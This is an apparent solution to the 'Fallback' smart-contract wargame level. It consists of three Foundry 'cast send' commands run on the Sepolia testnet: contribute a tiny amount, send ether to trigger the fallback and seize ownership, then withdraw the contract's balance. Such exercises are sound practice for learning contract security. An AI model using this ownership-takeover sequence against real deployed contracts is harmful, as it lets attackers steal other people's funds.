# Fallback Solution

```
cast send `ìnstanceAddress` "contribute()" --value 1wei --rpc-url $SEPOLIA_RPC_URL --account sepoliaKey
cast send `ìnstanceAddress` --value 1wei --rpc-url $SEPOLIA_RPC_URL --account sepoliaKey
cast send `ìnstanceAddress` "withdraw()" --rpc-url $SEPOLIA_RPC_URL --account sepoliaKey
```
